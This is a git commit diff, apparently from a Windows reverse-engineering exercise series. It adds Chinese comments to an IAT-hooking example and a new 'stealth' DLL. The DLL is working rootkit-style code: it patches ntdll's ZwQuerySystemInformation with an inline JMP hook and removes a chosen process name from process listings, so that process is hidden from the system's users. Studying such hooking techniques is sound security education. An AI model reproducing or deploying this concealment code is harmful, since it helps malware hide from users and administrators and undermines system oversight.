a8cfb2773e19f0dee4303608a906bf955609af48
ambitionxm <molanghon@qq.com>
2021-08-06 00:25:33 +0800

    add hideproc

--- 32_hookiat/dllmain.cpp
+++ 32_hookiat/dllmain.cpp
@@ -44,38 +44,49 @@ BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)
 
     // hMod, pAddr = ImageBase of calc.exe
     //             = VA to MZ signature (IMAGE_DOS_HEADER)
+    // 获取当前DLL的模块基址
     hMod = GetModuleHandle(NULL);
     pAddr = (PBYTE)hMod;
 
     // pAddr = VA to PE signature (IMAGE_NT_HEADERS)
+    // 偏移0x3C的地址指向PE字符的位置
     pAddr += *((DWORD*)&pAddr[0x3C]);
 
     // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table
+    // PE字符往后偏移0x80就是IDT的起始地址,其中包含了各个DLL的IMAGE_IMPORT_DESCRIPTOR
     dwRVA = *((DWORD*)&pAddr[0x80]);
 
     // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table
+    // 这里加上DLL的基地址，就是VA地址，即虚拟地址
     pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod + dwRVA);
 
     for (; pImportDesc->Name; pImportDesc++)
     {
         // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name
         szLibName = (LPCSTR)((DWORD)hMod + pImportDesc->Name);
+        // 判断是否是user32.dll对应的IMAGE_IMPORT_DESCRIPTOR
         if (!_stricmp(szLibName, szDllName))
         {
             // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk
             //        = VA to IAT(Import Address Table)
+
+            // pThunk的指向user32的IAT地址
             pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod +
                 pImportDesc->FirstThunk);
 
             // pThunk->u1.Function = VA to API
             for (; pThunk->u1.Function; pThunk++)
             {
+                // 这里的pfnOrg实际上就是SetWindowTextW
                 if (pThunk->u1.Function == (DWORD)pfnOrg)
                 {
+                    // VirtualProtect修改保护权限
                     VirtualProtect((LPVOID)&pThunk->u1.Function,
                         4,
                         PAGE_EXECUTE_READWRITE,
                         &dwOldProtect);
+
+                    // 修改IAT地址，这里pfnNew是MySetWindowTextW的地址
                     pThunk->u1.Function = (DWORD)pfnNew;
 
                     VirtualProtect((LPVOID)&pThunk->u1.Function,
---
+++ 33_stealth/dllmain.cpp
@@ -0,0 +1,202 @@
+﻿#include "windows.h"
+#include "tchar.h"
+
+#define STATUS_SUCCESS						(0x00000000L) 
+
+typedef LONG NTSTATUS;
+
+typedef enum _SYSTEM_INFORMATION_CLASS {
+    SystemBasicInformation = 0,
+    SystemPerformanceInformation = 2,
+    SystemTimeOfDayInformation = 3,
+    SystemProcessInformation = 5,
+    SystemProcessorPerformanceInformation = 8,
+    SystemInterruptInformation = 23,
+    SystemExceptionInformation = 33,
+    SystemRegistryQuotaInformation = 37,
+    SystemLookasideInformation = 45
+} SYSTEM_INFORMATION_CLASS;
+
+typedef struct _SYSTEM_PROCESS_INFORMATION {
+    ULONG NextEntryOffset;
+    ULONG NumberOfThreads;
+    BYTE Reserved1[48];
+    PVOID Reserved2[3];
+    HANDLE UniqueProcessId;
+    PVOID Reserved3;
+    ULONG HandleCount;
+    BYTE Reserved4[4];
+    PVOID Reserved5[11];
+    SIZE_T PeakPagefileUsage;
+    SIZE_T PrivatePageCount;
+    LARGE_INTEGER Reserved6[6];
+} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
+
+typedef NTSTATUS(WINAPI* PFZWQUERYSYSTEMINFORMATION)
+(SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength);
+
+#define DEF_NTDLL                       ("ntdll.dll")
+#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")
+
+
+// global variable (in sharing memory)
+#pragma comment(linker, "/SECTION:.SHARE,RWS")
+#pragma data_seg(".SHARE")
+TCHAR g_szProcName[MAX_PATH] = { 0, };
+#pragma data_seg()
+
+// global variable
+BYTE g_pOrgBytes[5] = { 0, };
+
+
+BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
+{
+    FARPROC pfnOrg;
+    DWORD dwOldProtect, dwAddress;
+    BYTE pBuf[5] = { 0xE9, 0, };
+    PBYTE pByte;
+
+    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
+    pByte = (PBYTE)pfnOrg;
+
+    if (pByte[0] == 0xE9)
+        return FALSE;
+
+    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+
+    memcpy(pOrgBytes, pfnOrg, 5);
+
+    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
+    memcpy(&pBuf[1], &dwAddress, 4);
+
+    memcpy(pfnOrg, pBuf, 5);
+
+    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);
+
+    return TRUE;
+}
+
+
+BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
+{
+    FARPROC pFunc;
+    DWORD dwOldProtect;
+    PBYTE pByte;
+
+    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
+    pByte = (PBYTE)pFunc;
+
+    if (pByte[0] != 0xE9)
+        return FALSE;
+
+    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+
+    memcpy(pFunc, pOrgBytes, 5);
+
+    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);
+
+    return TRUE;
+}
+
+
+NTSTATUS WINAPI NewZwQuerySystemInformation(
+    SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength)
+{
+    NTSTATUS status;
+    FARPROC pFunc;
+    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
+    char szProcName[MAX_PATH] = { 0, };
+
+    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);
+
+    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),
+        DEF_ZWQUERYSYSTEMINFORMATION);
+    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
+        (SystemInformationClass, SystemInformation,
+            SystemInformationLength, ReturnLength);
+
+    if (status != STATUS_SUCCESS)
+        goto __NTQUERYSYSTEMINFORMATION_END;
+
+    if (SystemInformationClass == SystemProcessInformation)
+    {
+        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
+
+        while (TRUE)
+        {
+            if (pCur->Reserved2[1] != NULL)
+            {
+                if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
+                {
+
+                    if (pCur->NextEntryOffset == 0)
+                        pPrev->NextEntryOffset = 0;
+                    else
+                        pPrev->NextEntryOffset += pCur->NextEntryOffset;
+                }
+                else
+                    pPrev = pCur;
+            }
+
+            if (pCur->NextEntryOffset == 0)
+                break;
+
+            pCur = (PSYSTEM_PROCESS_INFORMATION)
+                ((ULONG)pCur + pCur->NextEntryOffset);
+        }
+    }
+
+__NTQUERYSYSTEMINFORMATION_END:
+
+    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
+        (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
+
+    return status;
+}
+
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    char            szCurProc[MAX_PATH] = { 0, };
+    char* p = NULL;
+
+    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
+    p = strrchr(szCurProc, '\\');
+    if ((p != NULL) && !_stricmp(p + 1, "HideProc.exe"))
+        return TRUE;
+
+    switch (fdwReason)
+    {
+        // #2. API Hooking
+    case DLL_PROCESS_ATTACH:
+        hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
+            (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
+        break;
+
+        // #3. API Unhooking 
+    case DLL_PROCESS_DETACH:
+        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
+            g_pOrgBytes);
+        break;
+    }
+
+    return TRUE;
+}
+
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+    __declspec(dllexport) void SetProcName(LPCTSTR szProcName)
+    {
+        _tcscpy_s(g_szProcName, szProcName);
+    }
+#ifdef __cplusplus
+}
+#endif
